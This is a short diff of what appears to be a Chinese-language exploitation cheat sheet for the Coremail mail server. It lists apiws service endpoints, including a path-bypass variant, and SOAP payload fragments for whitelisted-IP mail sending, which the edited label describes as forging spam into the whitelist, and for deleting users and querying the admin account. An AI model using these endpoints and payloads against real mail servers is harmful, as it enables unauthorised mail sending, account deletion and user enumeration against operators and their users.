@@ -8,7 +8,7 @@ Website: www.hi-ourlife.com
 2.apiws
 http(s)://host/apiws/services/
 http(s)://host/./apiws/services/
-payload:
+伪造垃圾邮件进白名单payload:
 <ns1:sendmail2OneOrMore.........></ns1:sendmail2OneOrMore> 正常能发送这个包的都是白名单IP
 <deleteUser xmlns="http://coremail.cn/svncws">xxx</deleteUser>
 <nsl:queryTheUser xmlns:nsl="http://coremail.cn/apiws"><loginName>admin@admin.com<loginName></nsl:queryTheUser>
